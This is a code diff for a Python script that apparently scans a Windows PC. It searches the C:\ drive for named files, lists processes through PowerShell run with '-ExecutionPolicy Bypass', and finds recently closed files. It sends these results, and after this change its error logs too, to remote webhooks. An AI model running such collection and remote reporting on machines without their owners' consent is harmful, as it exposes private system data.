@@ -21,11 +21,33 @@ WEBHOOK_URLS = {
 # Webhook delay (in seconds)
 WEBHOOK_DELAY = 1
 
+# Path for the error log
+ERROR_LOG_PATH = os.path.join(os.getcwd(), 'output', 'error_log.txt')
+
+def log_error(message):
+    """Log errors to a text file and also send to the error webhook."""
+    print_status(message, 'error')
+    
+    # Create 'output' directory if it doesn't exist
+    os.makedirs(os.path.dirname(ERROR_LOG_PATH), exist_ok=True)
+    
+    # Log to file
+    with open(ERROR_LOG_PATH, 'a') as f:
+        f.write(f"{datetime.now()}: {message}\n")
+    
+    # Send to webhook
+    send_embed_to_webhook(
+        "Error Log",
+        message,
+        0xFF0000,  # Red color
+        'error'
+    )
+
 def send_embed_to_webhook(title, description, color, webhook_key):
     """Send a message to the webhook with an embedded format."""
     url = WEBHOOK_URLS.get(webhook_key)
     if not url:
-        print_status(f"Webhook URL not found for key: {webhook_key}", 'error')
+        log_error(f"Webhook URL not found for key: {webhook_key}")
         return
 
     max_description_length = 2000
@@ -46,7 +68,7 @@ def send_embed_to_webhook(title, description, color, webhook_key):
             response.raise_for_status()
             print_status(f"Embed sent to webhook: {title}", 'success')
         except requests.RequestException as e:
-            print_status(f"Failed to send embed to webhook: {e}", 'error')
+            log_error(f"Failed to send embed to webhook: {e}")
         
         time.sleep(WEBHOOK_DELAY)  # Ensure delay between webhook requests
 
@@ -78,7 +100,7 @@ def scan_directory(directory, file_names=None):
     while directories_to_scan:
         current_dir = directories_to_scan.pop()
         if not os.path.exists(current_dir):
-            print_status(f"Directory does not exist: {current_dir}", 'error')
+            log_error(f"Directory does not exist: {current_dir}")
             continue
         
         try:
@@ -95,7 +117,7 @@ def scan_directory(directory, file_names=None):
                     scanned_files += 1
                     total_files += 1
         except PermissionError:
-            print_status(f"Permission denied: {current_dir}", 'error')
+            log_error(f"Permission denied: {current_dir}")
             continue
 
     return results, total_files, scanned_files
@@ -104,7 +126,7 @@ def get_processes():
     command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
     output, error = run_command(command)
     if error:
-        print_status(f"Failed to get processes: {error}", 'error')
+        log_error(f"Failed to get processes: {error}")
     else:
         print_status("Retrieved processes.", 'success')
     return output or f"Error: {error}"
@@ -113,7 +135,7 @@ def get_admin_processes():
     command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Where-Object { $_.Path -like \'C:\\Windows\\System32\\*\' -or $_.Path -like \'C:\\Program Files*\\*\' } | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
     output, error = run_command(command)
     if error:
-        print_status(f"Failed to get admin processes: {error}", 'error')
+        log_error(f"Failed to get admin processes: {error}")
     else:
         print_status("Retrieved admin processes.", 'success')
     return output or f"Error: {error}"
@@ -129,7 +151,7 @@ def format_processes(processes):
             formatted.append(f"**{name}** (ID: {pid})\nPath: {path}")
         return "\n".join(formatted) if formatted else "No processes detected"
     except json.JSONDecodeError as e:
-        print_status(f"Format Processes Error: {e}", 'error')
+        log_error(f"Format Processes Error: {e}")
         return f"Error decoding process data: {str(e)}"
 
 def find_process_traces(name):
@@ -175,34 +197,22 @@ def find_recently_closed_files():
                 recent_files.append(path)
                 print_status(f"Found recently closed file: {path}", 'warning')
         except Exception as e:
-            print_status(f"Failed to get recent files: {e}", 'error')
+            log_error(f"Failed to get recent files: {e}")
 
     return recent_files
 
 def scan_recent_activity():
     """Scan recent activity like file deletions, openings, and renaming."""
     recent_activity = []
-    recent_files = find_recently_closed_files()
-    recent_activity.extend(recent_files)
-    # Add more activity detection here if needed
+    # Example placeholder for scanning recent activity
+    recent_activity.extend(find_recently_closed_files())
+    
     return recent_activity
 
-def scan_pc(specific_files=None):
-    """Scan the entire PC, checking directories for specific files."""
-    results = {}
-    total_files = 0
-    scanned_files = 0
-
-    if specific_files:
-        for file_name in specific_files:
-            file_results, tf, sf = scan_directory('C:\\', [file_name])
-            results[file_name] = file_results[file_name]
-            total_files += tf
-            scanned_files += sf
-    else:
-        # Scan entire PC without specific files
-        results, total_files, scanned_files = scan_directory('C:\\')
-
+def scan_pc(specific_files):
+    """Scan PC for specific files and report results."""
+    results, total_files, scanned_files = scan_directory('C:\\', specific_files)
+    
     send_embed_to_webhook(
         "PC Scan Results",
         f"Total files found: {total_files}\nScanned files: {scanned_files}\n\nResults:\n{json.dumps(results, indent=2)}",
@@ -267,7 +277,6 @@ def main():
         )
     elif choice == '2':
         # Implement database search functionality here
-        # Ensure all relevant information is gathered and reported
         send_embed_to_webhook(
             "Database Search Results",
             "Database search results go here.",
